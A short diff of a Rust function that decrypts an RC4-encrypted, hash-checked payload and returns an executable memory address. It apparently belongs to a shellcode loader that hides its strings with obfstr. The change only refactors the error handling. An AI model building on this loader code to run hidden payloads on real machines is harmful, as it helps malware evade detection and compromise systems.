@@ -1,17 +1,19 @@
 use crate::alloc::alloc;
 use obfstr::obfstr;
 
-pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
+pub unsafe fn decrypt(decoded: &[u8]) -> crate::utils::error::RslResult<(usize, usize)> {
     #[cfg(feature = "debug")]
     crate::utils::print_message("Using RC4 decryption...");
 
-    use rc4::{Rc4, StreamCipher, KeyInit};
-    use generic_array::{GenericArray, typenum::U32};
-    use sha2::{Sha256, Digest};
+    use generic_array::{typenum::U32, GenericArray};
+    use rc4::{KeyInit, Rc4, StreamCipher};
+    use sha2::{Digest, Sha256};
     let key_len = 32;
     let hash_len = 32;
     if decoded.len() < key_len + hash_len + 1 {
-        return Err(obfstr!("rc4 payload too short").to_string());
+        return Err(crate::utils::error::RslError::DecryptionError(
+            obfstr!("rc4 payload too short").to_string(),
+        ));
     }
     let key = &decoded[0..key_len];
     let hash = &decoded[key_len..key_len + hash_len];
@@ -26,7 +28,9 @@ pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
     hasher.update(buf);
     let calc_hash = hasher.finalize();
     if hash != calc_hash.as_slice() {
-        return Err(obfstr!("rc4 hash mismatch").to_string());
+        return Err(crate::utils::error::RslError::DecryptionError(
+            obfstr!("rc4 hash mismatch").to_string(),
+        ));
     }
     Ok((p as usize, encrypted.len())) // Return executable memory address
 }
